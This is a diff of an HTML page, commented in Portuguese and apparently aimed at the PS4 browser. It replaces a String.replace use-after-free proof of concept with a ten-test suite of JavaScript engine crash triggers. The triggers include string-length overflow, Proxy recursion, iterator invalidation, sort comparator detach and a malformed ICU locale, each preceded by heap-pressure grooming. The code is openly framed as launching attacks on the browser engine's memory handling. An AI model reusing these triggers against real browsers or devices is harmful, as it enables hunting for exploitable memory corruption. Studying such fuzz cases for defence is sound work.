@@ -3,79 +3,245 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 PoC: String Replace UAF (Isolado)</title>
+<title>PS4 Suite v150000: Exotic Edge</title>
 <style>
-    body { background: #222; color: #fff; font-family: monospace; padding: 20px; }
-    button { padding: 15px; background: #d00; color: #fff; border: 2px solid #fff; font-size: 20px; cursor: pointer; }
-    #log { border: 1px solid #0f0; background: #000; padding: 10px; height: 300px; margin-top: 20px; white-space: pre-wrap;}
+    body { background: #001; color: #0ff; font-family: 'Consolas', monospace; padding: 15px; }
+    button { 
+        width: 100%; padding: 12px; margin: 5px 0; 
+        background: #003; color: #0ff; border: 1px solid #0aa; 
+        cursor: pointer; text-align: left; font-weight: bold;
+    }
+    button:hover { background: #0ff; color: #000; }
+    #log { border: 1px dashed #0aa; height: 300px; overflow-y: scroll; padding: 10px; margin-top: 10px; background: #000; }
 </style>
 </head>
 <body>
 
-<h1>TESTE J02 ISOLADO: STRING REPLACE DETACH</h1>
-<p>Este teste roda o ataque dentro de uma caixa de areia. Se a tela piscar ou fechar, é Crash. Se aparecer "Sobreviveu", o browser protegeu a memória.</p>
+<h1>v150000: EXOTIC EDGE CASES</h1>
+<div id="log">Sistema aguardando input...</div>
 
-<button onclick="runAttack()">LANCAR ATAQUE</button>
+<button onclick="run(e01)">01. String.repeat Integer Overflow (Alloc Crash)</button>
+<button onclick="run(e02)">02. Array.flat Proxy Recursion (Stack Smash)</button>
+<button onclick="run(e03)">03. TypedArray.set Overlapping Memory Race</button>
 
-<div id="log">Pronto...</div>
+<button onclick="run(e04)">04. Canvas Path2D Infinity Coordinate (Float Panic)</button>
+<button onclick="run(e05)">05. Intl.Collator Malformed Locale (ICU Crash)</button>
+<button onclick="run(e06)">06. URLSearchParams Iterator Invalidation</button>
+
+<button onclick="run(e07)">07. Array.sort Comparator Detach</button>
+<button onclick="run(e08)">08. History State Cyclic Serializer Trap</button>
+<button onclick="run(e09)">09. DocumentFragment Recursive Append Cycle</button>
+<button onclick="run(e10)">10. Error.stack Accessor Side-Effect</button>
 
 <script>
     const L = document.getElementById('log');
-    function log(m) { L.innerHTML += "[*] " + m + "\n"; }
+    function log(msg) { L.innerHTML += "[>] " + msg + "\n"; L.scrollTop = L.scrollHeight; }
 
-    function pressure() {
-        const trash = [];
-        try {
-            for(let i=0; i<1000; i++) trash.push(new ArrayBuffer(1024 * 64));
-        } catch(e){}
-        trash.length = 0;
+    function run(fn) {
+        L.innerHTML += "\n--- TESTE " + fn.name + " ---\n";
+        // Pre-grooming
+        pressure();
+        setTimeout(() => {
+            try { 
+                fn(); 
+                log("Resultado: Sem Crash Imediato.");
+            } catch(e) { 
+                log("Exceção JS (Safe): " + e.message); 
+            }
+        }, 100);
     }
 
-    function runAttack() {
-        L.innerHTML = "";
-        log("1. Criando Iframe de Sacrifício...");
-        
-        const ifr = document.createElement('iframe');
-        document.body.appendChild(ifr);
-        
-        // Vamos rodar o código perigoso DENTRO do iframe
-        // Assim, se destruirmos o documento, destruímos apenas o iframe, não o Logger principal.
-        
+    // =================================================================
+    // 01. String.repeat Integer Overflow
+    // Tenta criar uma string cujo tamanho em bytes exceda 2^32-1.
+    // Se o motor calcular o tamanho do buffer usando int de 32 bits,
+    // ele alocará menos memória do que precisa -> Buffer Overflow.
+    // =================================================================
+    function e01() {
+        log("Tentando overflow de tamanho de string...");
         try {
-            const win = ifr.contentWindow;
-            
-            log("2. Criando Objeto Venenoso...");
-            const poison = {
-                toString: function() {
-                    log("3. GATILHO: toString() chamado pelo motor C++.");
-                    log("   -> Removendo Iframe da memória (Free)...");
-                    
-                    // Remove o iframe do DOM principal
-                    ifr.remove();
-                    
-                    // Força GC para limpar a memória do iframe
-                    pressure();
-                    
-                    log("   -> Tentando corromper o retorno...");
-                    // Retorna uma string gigante para forçar escrita na memória
-                    return "A".repeat(1024 * 1024); 
-                }
-            };
-
-            log("4. Executando String.replace...");
-            // O motor vai tentar substituir "X" pelo resultado de poison.toString()
-            // Mas durante o toString, o contexto de execução (iframe) morre.
-            "AAA".replace("A", poison);
-            
-            // Se chegar aqui, não crashou imediatamente
-            setTimeout(() => {
-                log("RESULTADO: O navegador sobreviveu. (Safe)");
-            }, 500);
-
+            // 2^29 * 4 (UTF-16) pode causar wrap around em 32-bit signed
+            // Isso geralmente lança RangeError, mas em versões antigas pode crashar.
+            "A".repeat(0x3FFFFFFF); 
         } catch(e) {
-            log("RESULTADO: Erro capturado pelo JS (Safe): " + e.message);
+            log("RangeError capturado (Safe).");
         }
     }
+
+    // =================================================================
+    // 02. Array.flat Proxy Recursion
+    // Array.flat() é recursivo. Se passarmos um Proxy que finge ser
+    // um array infinito, podemos estourar a pilha C++ do motor.
+    // =================================================================
+    function e02() {
+        log("Iniciando recursão infinita via Proxy...");
+        const p = new Proxy([], {
+            get: (target, prop) => {
+                if (prop === 'length') return 1;
+                if (prop === '0') return p; // Retorna a si mesmo
+                return target[prop];
+            }
+        });
+
+        // Tenta achatar infinitamente. O motor deve ter um guarda de profundidade.
+        // Se falhar, Stack Overflow crash.
+        p.flat(100000);
+    }
+
+    // =================================================================
+    // 03. TypedArray.set Overlapping Memory Race
+    // Tenta copiar dados de um array para ele mesmo em uma posição deslocada.
+    // Testa a robustez da implementação de `memmove` vs `memcpy`.
+    // =================================================================
+    function e03() {
+        log("Testando Overlapping Memory Copy...");
+        const buffer = new ArrayBuffer(1024);
+        const view = new Uint8Array(buffer);
+        // Preenche
+        for(let i=0; i<1024; i++) view[i] = i % 255;
+        
+        // Cria views que se sobrepõem
+        const v1 = new Uint8Array(buffer, 0, 512);
+        const v2 = new Uint8Array(buffer, 10, 512); // Deslocamento pequeno
+        
+        // Operação perigosa se não tratada corretamente
+        v2.set(v1);
+        log("Cópia realizada.");
+    }
+
+    // =================================================================
+    // 04. Canvas Path2D Infinity Coordinate
+    // Passa coordenadas infinitas para o motor gráfico.
+    // Algumas GPUs/Drivers crasham ao tentar renderizar NaN ou Infinity.
+    // =================================================================
+    function e04() {
+        log("Desenhando coordenadas Infinitas...");
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
+        const p = new Path2D();
+        
+        // Tenta forçar erro de cálculo de ponto flutuante na GPU
+        p.moveTo(0, 0);
+        p.lineTo(Infinity, Infinity); 
+        p.arcTo(0, 0, NaN, 100, 50);
+        
+        ctx.fill(p);
+    }
+
+    // =================================================================
+    // 05. Intl.Collator Malformed Locale (ICU Library)
+    // Passa uma string de localidade absurdamente longa e malformada.
+    // Ataca o parser da biblioteca ICU (C++).
+    // =================================================================
+    function e05() {
+        log("Enviando Locale malicioso para ICU...");
+        try {
+            // String gigante de extensões unicode inválidas
+            const badLocale = "en-u-co-phonebk-" + "a".repeat(10000);
+            new Intl.Collator(badLocale);
+        } catch(e) {
+            log("Erro de formato (Safe).");
+        }
+    }
+
+    // =================================================================
+    // 06. URLSearchParams Iterator Invalidation
+    // Itera sobre parâmetros enquanto deleta chaves.
+    // Testa Use-After-Free no iterador interno.
+    // =================================================================
+    function e06() {
+        log("Iterando e deletando SearchParams...");
+        const p = new URLSearchParams("a=1&b=2&c=3&d=4");
+        // O loop for..of usa o iterador
+        for (const [key, value] of p) {
+            if (key === 'a') {
+                // Deleta itens futuros para invalidar o ponteiro do iterador
+                p.delete('b');
+                p.delete('c');
+                pressure(); // GC
+            }
+        }
+    }
+
+    // =================================================================
+    // 07. Array.sort Comparator Detach
+    // Durante a ordenação, usa a função de comparação para
+    // limpar o array, causando acesso fora dos limites.
+    // =================================================================
+    function e07() {
+        log("Array Sort Detach...");
+        const arr = [1, 2, 3, 4, 5];
+        arr.sort((a, b) => {
+            log("Comparator: Zerando array...");
+            arr.length = 0; // Esvazia o array no meio do sort
+            pressure();
+            return a - b;
+        });
+    }
+
+    // =================================================================
+    // 08. History State Cyclic Serializer Trap
+    // Cria um objeto que se referencia (ciclo) e tenta salvar no histórico.
+    // Testa se o algoritmo de clonagem estruturada entra em loop infinito.
+    // =================================================================
+    function e08() {
+        log("Criando Ciclo de Referência...");
+        const a = {};
+        const b = { parent: a };
+        a.child = b; // Ciclo A -> B -> A
+        
+        log("PushState (Serializer Stress)...");
+        try {
+            history.pushState(a, "Cycle", null);
+        } catch(e) {
+            log("Erro de Clone (Safe): " + e.message);
+        }
+    }
+
+    // =================================================================
+    // 09. DocumentFragment Recursive Append Cycle
+    // Tenta adicionar um fragmento dentro de um nó que está dentro do fragmento.
+    // =================================================================
+    function e09() {
+        log("Hierarquia Cíclica de Fragmentos...");
+        const frag = document.createDocumentFragment();
+        const div = document.createElement('div');
+        frag.appendChild(div);
+        
+        try {
+            // Tenta colocar o fragmento dentro do div (que está no fragmento)
+            div.appendChild(frag);
+        } catch(e) {
+            log("HierarchyRequestError (Safe).");
+        }
+    }
+
+    // =================================================================
+    // 10. Error.stack Accessor Side-Effect
+    // O acesso à propriedade .stack gera uma string na hora.
+    // Podemos causar recursão infinita se o gerador de stack falhar.
+    // =================================================================
+    function e10() {
+        log("Stack Trace Flood...");
+        function recurse(i) {
+            if (i <= 0) {
+                try { throw new Error("Boom"); } 
+                catch(e) { return e.stack; } // Gera stack trace gigante
+            }
+            return recurse(i - 1);
+        }
+        // Profundidade controlada para não ser só "too much recursion"
+        // mas sim gerar um objeto de erro muito pesado.
+        recurse(1000);
+    }
+
+    // Helper de Pressão de Memória
+    function pressure() {
+        const t = [];
+        for(let i=0; i<100; i++) t.push(new ArrayBuffer(64*1024));
+        t.length = 0;
+    }
+
 </script>
 </body>
 </html>
